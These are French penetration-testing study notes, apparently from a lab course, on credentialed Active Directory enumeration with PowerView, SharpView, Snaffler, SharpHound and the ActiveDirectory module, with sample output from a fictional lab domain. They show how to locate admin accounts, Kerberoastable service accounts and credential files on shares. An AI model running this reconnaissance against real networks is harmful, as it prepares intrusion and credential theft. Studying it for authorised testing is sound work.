| --- | --- |
| **Export-PowerViewCSV** | Ajoute les résultats à un fichier CSV |
| **ConvertTo-SID** | Convertit un nom d'utilisateur ou de groupe en sa valeur SID |
| **Get-DomainSPNTicket** | Demande le ticket Kerberos pour un compte Service Principal Name (SPN) spécifié |

#### Fonctions Domain/LDAP :
| Commande | Description |
| --- | --- |
| **Get-Domain** | Retourne l'objet AD pour le domaine actuel (ou spécifié) |
| **Get-DomainController** | Retourne une liste des contrôleurs de domaine pour le domaine spécifié |
| **Get-DomainUser** | Retourne tous les utilisateurs ou des objets utilisateur spécifiques dans AD |
| **Get-DomainComputer** | Retourne tous les ordinateurs ou des objets ordinateur spécifiques dans AD |
| **Get-DomainGroup** | Retourne tous les groupes ou des objets groupe spécifiques dans AD |
| **Get-DomainOU** | Recherche tous les objets OU ou des objets OU spécifiques dans AD |
| **Find-InterestingDomainAcl** | Trouve les ACL d'objets dans le domaine avec des droits de modification définis sur des objets non intégrés |
| **Get-DomainGroupMember** | Retourne les membres d'un groupe de domaine spécifique |
| **Get-DomainFileServer** | Retourne une liste de serveurs fonctionnant probablement comme serveurs de fichiers |
| **Get-DomainDFSShare** | Retourne une liste de tous les systèmes de fichiers distribués pour le domaine actuel (ou spécifié) |

#### Fonctions GPO :
| Commande | Description |
| --- | --- |
| **Get-DomainGPO** | Retourne tous les GPO ou des objets GPO spécifiques dans AD |
| **Get-DomainPolicy** | Retourne la politique de domaine par défaut ou la politique du contrôleur de domaine pour le domaine actuel |

#### Fonctions d'énumération des ordinateurs :
| Commande | Description |
| --- | --- |
| **Get-NetLocalGroup** | Énumère les groupes locaux sur la machine locale ou une machine distante |
| **Get-NetLocalGroupMember** | Énumère les membres d'un groupe local spécifique |
| **Get-NetShare** | Retourne les partages ouverts sur la machine locale (ou une machine distante) |
| **Get-NetSession** | Retourne les informations de session pour la machine locale (ou une machine distante) |
| **Test-AdminAccess** | Teste si l'utilisateur actuel a un accès administratif à la machine locale (ou une machine distante) |

#### Fonctions 'Meta' Threaded :
| Commande | Description |
| --- | --- |
| **Find-DomainUserLocation** | Trouve les machines où des utilisateurs spécifiques sont connectés |
| **Find-DomainShare** | Trouve des partages accessibles sur les machines du domaine |
| **Find-InterestingDomainShareFile** | Recherche des fichiers correspondant à des critères spécifiques sur des partages lisibles dans le domaine |
| **Find-LocalAdminAccess** | Trouve des machines sur le domaine local où l'utilisateur actuel a un accès administrateur local |

#### Fonctions de confiance de domaine :
| Commande | Description |
| --- | --- |
| **Get-DomainTrust** | Retourne les relations de confiance de domaine pour le domaine actuel ou un domaine spécifié |
| **Get-ForestTrust** | Retourne toutes les relations de confiance de forêt pour la forêt actuelle ou une forêt spécifiée |
| **Get-DomainForeignUser** | Énumère les utilisateurs qui sont dans des groupes en dehors du domaine de l'utilisateur |
| **Get-DomainForeignGroupMember** | Énumère les groupes avec des utilisateurs en dehors du domaine du groupe et retourne chaque membre étranger |
| **Get-DomainTrustMapping** | Énumère toutes les relations de confiance pour le domaine actuel et tous les autres domaines vus |


Cette commande PowerShell récupère les informations détaillées sur un utilisateur spécifique dans Active Directory (AD) en utilisant son identité (ici, mmorgan) et le domaine spécifié (inlanefreight.local). Elle sélectionne ensuite des propriétés spécifiques de l’utilisateur pour les afficher. Utile pour obtenir des détails précis sur un utilisateur particulier, ce qui peut aider à gérer les comptes et les permissions dans un environnement AD.

```powershell
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

name                 : Matthew Morgan
samaccountname       : mmorgan
description          :
memberof             : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar
                       Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security
                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security
                       Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL...}
whencreated          : 10/27/2021 5:37:06 PM
pwdlastset           : 11/18/2021 10:02:57 AM
lastlogontimestamp   : 2/27/2022 6:34:25 PM
accountexpires       : NEVER
admincount           : 1
userprincipalname    : mmorgan@inlanefreight.local
serviceprincipalname :
mail                 :
useraccountcontrol   : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

Cette commande PowerShell utilise PowerView pour récupérer tous les membres du groupe “Domain Admins” dans Active Directory, y compris les membres des groupes imbriqués. Utile pour obtenir une vue complète des utilisateurs et groupes ayant des privilèges administratifs dans le domaine, ce qui peut aider à auditer les permissions et à identifier les risques de sécurité potentiels.

```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : svc_qualys
MemberDistinguishedName : CN=svc_qualys,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-5613

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : sp-admin
MemberDistinguishedName : CN=Sharepoint Admin,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-5228

GroupDomain             : INLANEFREIGHT.LOCAL
GroupName               : Secadmins
GroupDistinguishedName  : CN=Secadmins,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberDomain            : INLANEFREIGHT.LOCAL
MemberName              : spong1990
MemberDistinguishedName : CN=Maggie
                          Jablonski,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
MemberObjectClass       : user
MemberSID               : S-1-5-21-3842939050-3880317879-2865463114-1965

<SNIP>
```

Cette commande PowerShell utilise PowerView pour mapper toutes les relations de confiance de domaine accessibles. Utile pour obtenir une vue d’ensemble des relations de confiance établies entre différents domaines ou forêts, ce qui peut aider à comprendre les connexions et les permissions entre eux.
```
Get-DomainTrustMapping

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM

SourceName      : INLANEFREIGHT.LOCAL
TargetName      : FREIGHTLOGISTICS.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 8:07:09 PM
WhenChanged     : 2/27/2022 12:02:39 AM

SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL
TargetName      : INLANEFREIGHT.LOCAL
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 11/1/2021 6:20:22 PM
WhenChanged     : 2/26/2022 11:55:55 PM
```

Cette commande PowerShell teste si l’utilisateur actuel a un accès administratif à l’ordinateur spécifié (ici, ACADEMY-EA-MS01). Utile pour vérifier les permissions administratives sur des machines locales ou distantes, ce qui peut aider à auditer les accès et les privilèges dans un environnement Active Directory.
```powershell
Test-AdminAccess -ComputerName ACADEMY-EA-MS01

ComputerName    IsAdmin
------------    -------
ACADEMY-EA-MS01    True
```

Cette commande PowerShell utilise PowerView pour récupérer tous les utilisateurs dans Active Directory (AD) qui ont un Service Principal Name (SPN) défini. Utile pour identifier les comptes de service, car ces comptes sont souvent utilisés par des applications et des services pour s’authentifier auprès d’autres services.

```powershell
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

serviceprincipalname                          samaccountname
--------------------                          --------------
adfsconnect/azure01.inlanefreight.local       adfs
backupjob/veam001.inlanefreight.local         backupagent
d0wngrade/kerberoast.inlanefreight.local      d0wngrade
kadmin/changepw                               krbtgt
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 sqldev
MSSQLSvc/SPSJDB.inlanefreight.local:1433      sqlprod
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351 sqlqa
sts/inlanefreight.local                       solarwindsmonitor
testspn/kerberoast.inlanefreight.local        testspn
testspn2/kerberoast.inlanefreight.local       testspn2
```

La commande Get-DomainUser de SharpView permet de récupérer des informations sur les utilisateurs dans Active Directory (AD). Elle offre de nombreux paramètres pour affiner la recherche et obtenir des détails spécifiques sur les utilisateurs.

```powershell
 .\SharpView.exe Get-DomainUser -Help

Get_DomainUser -Identity <String[]> -DistinguishedName <String[]> -SamAccountName <String[]> -Name <String[]> -MemberDistinguishedName <String[]> -MemberName <String[]> -SPN <Boolean> -AdminCount <Boolean> -AllowDelegation <Boolean> -DisallowDelegation <Boolean> -TrustedToAuth <Boolean> -PreauthNotRequired <Boolean> -KerberosPreauthNotRequired <Boolean> -NoPreauth <Boolean> -Domain <String> -LDAPFilter <String> -Filter <String> -Properties <String[]> -SearchBase <String> -ADSPath <String> -Server <String> -DomainController <String> -SearchScope <SearchScope> -ResultPageSize <Int32> -ServerTimeLimit <Nullable`1> -SecurityMasks <Nullable`1> -Tombstone <Boolean> -FindOne <Boolean> -ReturnOne <Boolean> -Credential <NetworkCredential> -Raw <Boolean> -UACFilter <UACEnum>
```

Cette commande SharpView récupère les informations sur un utilisateur spécifique dans Active Directory (AD) en utilisant son identité (ici, forend). Utile pour obtenir des détails précis sur cet utilisateur particulier, ce qui peut aider à gérer les comptes et les permissions dans un environnement AD.

```powershell
PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend

[Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
[Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=forend)))
objectsid                      : {S-1-5-21-3842939050-3880317879-2865463114-5614}
samaccounttype                 : USER_OBJECT
objectguid                     : 53264142-082a-4cb8-8714-8158b4974f3b
useraccountcontrol             : NORMAL_ACCOUNT
accountexpires                 : 12/31/1600 4:00:00 PM
lastlogon                      : 4/18/2022 1:01:21 PM
lastlogontimestamp             : 4/9/2022 1:33:21 PM
pwdlastset                     : 2/28/2022 12:03:45 PM
lastlogoff                     : 12/31/1600 4:00:00 PM
badPasswordTime                : 4/5/2022 7:09:07 AM
name                           : forend
distinguishedname              : CN=forend,OU=IT Admins,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
whencreated                    : 2/28/2022 8:03:45 PM
whenchanged                    : 4/9/2022 8:33:21 PM
samaccountname                 : forend
memberof                       : {CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Shared Calendar Read,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=Printer Access,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share H Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL, CN=File Share G Drive,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL}
cn                             : {forend}
objectclass                    : {top, person, organizationalPerson, user}
badpwdcount                    : 0
countrycode                    : 0
usnchanged                     : 3259288
logoncount                     : 26618
primarygroupid                 : 513
objectcategory                 : CN=Person,CN=Schema,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
dscorepropagationdata          : {3/24/2022 3:58:07 PM, 3/24/2022 3:57:44 PM, 3/24/2022 3:52:58 PM, 3/24/2022 3:49:31 PM, 7/14/1601 10:36:49 PM}
usncreated                     : 3054181
instancetype                   : 4
codepage                       : 0
```

Cette commande utilise Snaffler pour scanner un domaine Active Directory (ici, inlanefreight.local) à la recherche de données sensibles et les enregistre dans un fichier de log (snaffler.log). Le paramètre -v data spécifie que la commande doit être exécutée en mode verbeux pour les données.

```powershell
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

```powershell
PS C:\htb> .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data

 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler

2022-03-31 12:16:54 -07:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\ADMIN$)
2022-03-31 12:16:54 -07:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\C$)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL\address)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\User Shares)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\ZZZ_archive)
2022-03-31 12:17:18 -07:00 [Share] {Green}(\\ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL\CertEnroll)
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.kdb$|289B|3/31/2022 12:09:22 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\GroupBackup.kdb) .kdb
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.key$|299B|3/31/2022 12:05:33 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\ShowReset.key) .key
2022-03-31 12:17:19 -07:00 [Share] {Green}(\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\UpdateServicesPackages)
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.kwallet$|302B|3/31/2022 12:04:45 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\WriteUse.kwallet) .kwallet
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.key$|298B|3/31/2022 12:05:10 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\ProtectStep.key) .key
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.ppk$|275B|3/31/2022 12:04:40 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\StopTrace.ppk) .ppk
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.key$|301B|3/31/2022 12:09:17 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\WaitClear.key) .key
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.sqldump$|312B|3/31/2022 12:05:30 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\DenyRedo.sqldump) .sqldump
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.sqldump$|310B|3/31/2022 12:05:02 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\AddPublish.sqldump) .sqldump
2022-03-31 12:17:19 -07:00 [Share] {Green}(\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\WsusContent)
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.keychain$|295B|3/31/2022 12:08:42 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\SetStep.keychain) .keychain
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.tblk$|279B|3/31/2022 12:05:25 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\FindConnect.tblk) .tblk
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.psafe3$|301B|3/31/2022 12:09:33 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\GetUpdate.psafe3) .psafe3
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.keypair$|278B|3/31/2022 12:09:09 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\UnprotectConvertTo.keypair) .keypair
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.tblk$|280B|3/31/2022 12:05:17 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\ExportJoin.tblk) .tblk
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.mdf$|305B|3/31/2022 12:09:27 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\FormatShow.mdf) .mdf
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.mdf$|299B|3/31/2022 12:09:14 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Development\LockConfirm.mdf) .mdf

<SNIP>
```

Cette commande SharpHound collecte toutes les données disponibles dans un environnement Active Directory (AD) et les enregistre dans un fichier ZIP nommé ILFREIGHT.zip. Utile pour effectuer une analyse complète de l’AD, ce qui peut aider à identifier les relations et les permissions au sein du domaine.

```powershell
PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT

2022-04-18T13:58:22.1163680-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-04-18T13:58:22.1163680-07:00|INFORMATION|Initializing SharpHound at 1:58 PM on 4/18/2022
2022-04-18T13:58:22.6788709-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-04-18T13:58:23.0851206-07:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL
2022-04-18T13:58:53.9132950-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 67 MB RAM
2022-04-18T13:59:15.7882419-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-04-18T13:59:16.1788930-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-04-18T13:59:23.9288698-07:00|INFORMATION|Status: 3793 objects finished (+3793 63.21667)/s -- Using 112 MB RAM
2022-04-18T13:59:45.4132561-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2022-04-18T13:59:45.4601086-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2022-04-18T13:59:45.8663528-07:00|INFORMATION|Status: 3809 objects finished (+16 46.45122)/s -- Using 110 MB RAM
2022-04-18T13:59:45.8663528-07:00|INFORMATION|Enumeration finished in 00:01:22.7919186
2022-04-18T13:59:46.3663660-07:00|INFORMATION|SharpHound Enumeration Completed at 1:59 PM on 4/18/2022! Happy Graphing
```

## Credentialed Enumeration - from Windows

### Load ActiveDirectory Module

```powershell
PS C:\htb> Import-Module ActiveDirectory
PS C:\htb> Get-Module

ModuleType Version    Name                                ExportedCommands
---------- -------    ----                                ----------------
Manifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...
Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...  
```


### Get Domain Info

```powershell
PS C:\htb> Get-ADDomain

AllowedDNSSuffixes                 : {}
ChildDomains                       : {LOGISTICS.INLANEFREIGHT.LOCAL}
ComputersContainer                 : CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
DeletedObjectsContainer            : CN=Deleted Objects,DC=INLANEFREIGHT,DC=LOCAL
DistinguishedName                  : DC=INLANEFREIGHT,DC=LOCAL
DNSRoot                            : INLANEFREIGHT.LOCAL
DomainControllersContainer         : OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-3842939050-3880317879-2865463114
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=INLANEFREIGHT,DC=LOCAL
Forest                             : INLANEFREIGHT.LOCAL
InfrastructureMaster               : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {cn={DDBB8574-E94E-4525-8C9D-ABABE31223D0},cn=policies,cn=system,DC=INLANEFREIGHT,
                                     DC=LOCAL, CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=INLAN
                                     EFREIGHT,DC=LOCAL}
LostAndFoundContainer              : CN=LostAndFound,DC=INLANEFREIGHT,DC=LOCAL
ManagedBy                          :
Name                               : INLANEFREIGHT
NetBIOSName                        : INLANEFREIGHT
ObjectClass                        : domainDNS
ObjectGUID                         : 71e4ecd1-a9f6-4f55-8a0b-e8c398fb547a
ParentDomain                       :
PDCEmulator                        : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=INLANEFREIGHT,DC=LOCAL
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL}
RIDMaster                          : ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
SubordinateReferences              : {DC=LOGISTICS,DC=INLANEFREIGHT,DC=LOCAL,
                                     DC=ForestDnsZones,DC=INLANEFREIGHT,DC=LOCAL,
                                     DC=DomainDnsZones,DC=INLANEFREIGHT,DC=LOCAL,
                                     CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL}
SystemsContainer                   : CN=System,DC=INLANEFREIGHT,DC=LOCAL
UsersContainer                     : CN=Users,DC=INLANEFREIGHT,DC=LOCAL
```

### Get-ADUser

```powershell
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

DistinguishedName    : CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled              : True
GivenName            : Sharepoint
Name                 : adfs
ObjectClass          : user
ObjectGUID           : 49b53bea-4bc4-4a68-b694-b806d9809e95
SamAccountName       : adfs
ServicePrincipalName : {adfsconnect/azure01.inlanefreight.local}
SID                  : S-1-5-21-3842939050-3880317879-2865463114-5244
Surname              : Admin
UserPrincipalName    :

DistinguishedName    : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
Enabled              : True
GivenName            : Jessica
Name                 : BACKUPAGENT
ObjectClass          : user
ObjectGUID           : 2ec53e98-3a64-4706-be23-1d824ff61bed
SamAccountName       : backupagent
ServicePrincipalName : {backupjob/veam001.inlanefreight.local}
SID                  : S-1-5-21-3842939050-3880317879-2865463114-5220
Surname              : Systemmailbox 8Cc370d3-822A-4Ab8-A926-Bb94bd0641a9
UserPrincipalName    :

<SNIP>
```

###  Checking For Trust Relationships

```powershell
PS C:\htb> Get-ADTrust -Filter *

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
TGTDelegation           : False
TrustAttributes         : 32
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : FREIGHTLOGISTICS.LOCAL
ObjectClass             : trustedDomain
ObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=INLANEFREIGHT,DC=LOCAL
Target                  : FREIGHTLOGISTICS.LOCAL
TGTDelegation           : False
TrustAttributes         : 8
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False
```

### Group Enumeration

```powershell
Get-ADGroup -Filter * | select name

name
----
Administrators
Users
Guests
Print Operators
Backup Operators
Replicator
Remote Desktop Users
Network Configuration Operators
Performance Monitor Users
Performance Log Users
Distributed COM Users
IIS_IUSRS
Cryptographic Operators
Event Log Readers
Certificate Service DCOM Access
RDS Remote Access Servers
RDS Endpoint Servers
RDS Management Servers
Hyper-V Administrators
Access Control Assistance Operators
Remote Management Users
Storage Replica Administrators
Domain Computers
Domain Controllers
Schema Admins
Enterprise Admins
Cert Publishers
Domain Admins

<SNIP>
```

### Detailed Group Info

```powershell
PS C:\htb> Get-ADGroup -Identity "Backup Operators"

DistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL
GroupCategory     : Security
GroupScope        : DomainLocal
Name              : Backup Operators
ObjectClass       : group
ObjectGUID        : 6276d85d-9c39-4b7c-8449-cad37e8abc38
SamAccountName    : Backup Operators
SID               : S-1-5-32-551
```

### Group Membership

```powershell
PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"

distinguishedName : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
name              : BACKUPAGENT
objectClass       : user
objectGUID        : 2ec53e98-3a64-4706-be23-1d824ff61bed
SamAccountName    : backupagent
SID               : S-1-5-21-3842939050-3880317879-2865463114-5220
```

### PowerView

PowerView est un outil écrit en PowerShell pour nous aider à obtenir une connaissance situationnelle dans un environnement AD. Tout comme BloodHound, il permet d'identifier où les utilisateurs sont connectés sur un réseau, d'énumérer les informations de domaine telles que les utilisateurs, les ordinateurs, les groupes, les ACL, les trusts, de rechercher des partages de fichiers et des mots de passe, d'effectuer des attaques de type Kerberoasting, et plus encore. C'est un outil très polyvalent qui peut nous fournir une grande visibilité sur la posture de sécurité du domaine de notre client. Il nécessite plus de travail manuel pour déterminer les mauvaises configurations et les relations au sein du domaine que BloodHound, mais, lorsqu'il est utilisé correctement, il peut nous aider à identifier des mauvaises configurations subtiles.

Examinons certaines des capacités de PowerView et voyons quelles données il renvoie. Le tableau ci-dessous décrit certaines des fonctions les plus utiles offertes par PowerView.

| Commande | Description |
| --- | --- |
| `Export-PowerViewCSV` | Ajouter les résultats à un fichier CSV |
| `ConvertTo-SID` | Convertir un nom d'utilisateur ou de groupe en sa valeur SID |
| `Get-DomainSPNTicket` | Demande le ticket Kerberos pour un compte SPN spécifié |

#### Fonctions de domaine/LDAP :

| Commande | Description |
| --- | --- |
| `Get-Domain` | Renvoie l'objet AD pour le domaine actuel (ou spécifié) |
| `Get-DomainController` | Renvoie une liste des contrôleurs de domaine pour le domaine spécifié |
| `Get-DomainUser` | Renvoie tous les utilisateurs ou des objets utilisateur spécifiques dans AD |
| `Get-DomainComputer` | Renvoie tous les ordinateurs ou des objets ordinateur spécifiques dans AD |
| `Get-DomainGroup` | Renvoie tous les groupes ou des objets groupe spécifiques dans AD |
| `Get-DomainOU` | Recherche tous les objets OU ou des objets OU spécifiques dans AD |
| `Find-InterestingDomainAcl` | Trouve les ACL d'objets dans le domaine avec des droits de modification définis sur des objets non intégrés |
| `Get-DomainGroupMember` | Renvoie les membres d'un groupe de domaine spécifique |
| `Get-DomainFileServer` | Renvoie une liste de serveurs fonctionnant probablement comme serveurs de fichiers |
| `Get-DomainDFSShare` | Renvoie une liste de tous les systèmes de fichiers distribués pour le domaine actuel (ou spécifié) |

#### Fonctions GPO :

| Commande | Description |
| --- | --- |
| `Get-DomainGPO` | Renvoie tous les GPO ou des objets GPO spécifiques dans AD |
| `Get-DomainPolicy` | Renvoie la politique de domaine par défaut ou la politique du contrôleur de domaine pour le domaine actuel |

#### Fonctions d'énumération des ordinateurs :

| Commande | Description |
